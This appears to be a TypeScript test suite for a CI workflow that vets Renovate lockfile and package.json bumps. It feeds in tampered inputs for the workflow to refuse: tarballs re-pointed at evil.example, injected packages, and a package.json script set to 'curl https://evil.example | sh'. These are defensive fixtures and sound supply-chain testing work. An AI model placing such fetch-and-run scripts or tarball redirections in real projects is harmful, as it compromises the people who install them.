import assert from "node:assert/strict";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, test } from "node:test";
import { readText } from "./helpers/read.ts";
import { BASE, BUMP, type Manifest, apply, devDependencies, lockfile, manifest, refusal } from "./helpers/push.ts";
import { git, root } from "./helpers/workflow.ts";

const fixture = (name: string): string => readText(new URL(`./fixtures/redis-82/${name}`, import.meta.url));

/** `text` with each `[from, to]` replaced, each `from` found exactly once. */
function replaced(text: string, replacements: readonly (readonly [string, string])[]): string {
  return replacements.reduce((current, [from, to]) => {
    assert.equal(current.split(from).length, 2, from);
    return current.replace(from, to);
  }, text);
}

const bumped = (fields: Manifest) => ({ ...BUMP, "package.json": manifest({ ...devDependencies("0.10.14"), ...fields }) });

describe("ci-renovate-sync.yml push job reads the lockfile and the manifest by default-deny", () => {
  test("refuses an existing third-party key re-pointed at another tarball (n1)", () => {
    const lock = replaced(BUMP["pnpm-lock.yaml"], [["  'oxlint@1.0.0':\n    resolution: {integrity: sha512-x}", "  'oxlint@1.0.0':\n    resolution: {tarball: https://evil.example/oxlint.tgz}"]]);

    assert.match(refusal({ ...BUMP, "pnpm-lock.yaml": lock }), /packages oxlint@1\.0\.0 \(pnpm-lock\.yaml\)/);
  });

  test("refuses a packages section indented 4 spaces (n2)", () => {
    const lock = replaced(BUMP["pnpm-lock.yaml"], [
      ["  '@antelopejs/tooling-configs@0.10.14':\n    resolution: {integrity: sha512-x}\n", "    '@antelopejs/tooling-configs@0.10.14':\n      resolution: {integrity: sha512-x}\n\n    'evil@1.0.0':\n      resolution: {integrity: sha512-x}\n"],
    ]);

    assert.match(refusal({ ...BUMP, "pnpm-lock.yaml": lock }), /unreadable pnpm-lock\.yaml \(indentation, line \d+\)/);
  });

  test("refuses a packages: line with a trailing space (n2b)", () => {
    const lock = replaced(BUMP["pnpm-lock.yaml"], [["\npackages:\n", "\npackages: \n"]]);

    assert.match(refusal({ ...BUMP, "pnpm-lock.yaml": lock }), /unreadable pnpm-lock\.yaml \(tab or trailing space, line \d+\)/);
  });

  test("refuses an @antelopejs/ key that resolves to a tarball (n7)", () => {
    const lock = lockfile(["@antelopejs/tooling-configs@0.10.14", "oxlint@1.0.0"]).replace("\nsnapshots:", "\n  '@antelopejs/evil@1.0.0':\n    resolution: {tarball: https://evil.example/evil.tgz}\n\nsnapshots:");

    assert.match(refusal({ ...BUMP, "pnpm-lock.yaml": lock }), /packages @antelopejs\/evil@1\.0\.0 \(pnpm-lock\.yaml\): +resolution: \{tarball/);
  });

  test("refuses any package.json field outside the dependency sections (n4b to n4e)", () => {
    const fields: Manifest[] = [
      { scripts: { format: "curl https://evil.example | sh" } },
      { packageManager: "pnpm@12.0.0+sha512.evil" },
      { pnpm: { packageExtensions: { oxlint: { dependencies: { evil: "1.0.0" } } } } },
      { pnpm: { onlyBuiltDependencies: ["evil"] } },
      { dependenciesMeta: { oxlint: { injected: true } } },
      { workspaces: ["evil"] },
    ];
    for (const field of fields) {
      assert.match(refusal(bumped(field)), /fields outside the dependency sections \(package\.json\)/, JSON.stringify(field));
    }
  });
});

describe("ci-renovate-sync.yml push job on the real lockfile of AntelopeJS/redis#82", () => {
  const base = { "package.json": fixture("package.json"), "pnpm-lock.yaml": fixture("pnpm-lock.yaml") };
  const scratch = join(root, "redis-82");
  mkdirSync(scratch);
  writeFileSync(join(scratch, "pnpm-lock.yaml"), base["pnpm-lock.yaml"]);
  writeFileSync(join(scratch, "renovate.patch"), fixture("renovate.patch"));
  git(scratch, "apply", "renovate.patch");
  const renovate = readText(join(scratch, "pnpm-lock.yaml"));

  test("refuses Renovate's own bump: the range stays and @oxlint/plugins moves with it", () => {
    assert.match(refusal({ "pnpm-lock.yaml": renovate }, base), /from '\^0\.10\.7' to '\^0\.10\.7'/);
    const ranged = replaced(base["package.json"], [['"@antelopejs/tooling-configs": "^0.10.7"', '"@antelopejs/tooling-configs": "^0.10.11"']]);
    const lock = replaced(renovate, [["specifier: ^0.10.7\n        version: 0.10.11(", "specifier: ^0.10.11\n        version: 0.10.11("]]);

    assert.match(refusal({ "package.json": ranged, "pnpm-lock.yaml": lock }, base), /packages @oxlint\/plugins@1\.95\.0 \(pnpm-lock\.yaml\)/);
  });

  test("applies the same bump once it moves only @antelopejs/tooling-configs", () => {
    const lock = replaced(renovate, [
      ["specifier: ^0.10.7\n        version: 0.10.11(", "specifier: ^0.10.11\n        version: 0.10.11("],
      [
        "'@oxlint/plugins@1.95.0':\n    resolution: {integrity: sha512-wb81nObfxWVASxtMQknyL4A387XDVuSIgpL1/wlhWzGpWLAGMzEvI+xWXJ242Bk8qqAmgDwG6ejetKnLISTGGw==}",
        "'@oxlint/plugins@1.94.0':\n    resolution: {integrity: sha512-YT6htikBOBQ00XDxZpRZLZ0anEDo7h9s4+YvjRU0/Ng/cLd0D6SZQ3tsms4g/GDer/z8UKlegC5iptEfyRXJcw==}",
      ],
      ["'@oxlint/plugins': 1.95.0", "'@oxlint/plugins': 1.94.0"],
      ["'@oxlint/plugins@1.95.0': {}", "'@oxlint/plugins@1.94.0': {}"],
    ]);
    const head = { "package.json": replaced(base["package.json"], [['"@antelopejs/tooling-configs": "^0.10.7"', '"@antelopejs/tooling-configs": "^0.10.11"']]), "pnpm-lock.yaml": lock };

    const { result } = apply(head, "true", undefined, base);

    assert.equal(result.status, 0, result.stdout);
  });

  test("still applies the synthetic control bump", () => {
    assert.equal(apply(BUMP, "true", undefined, BASE).result.status, 0);
  });
});
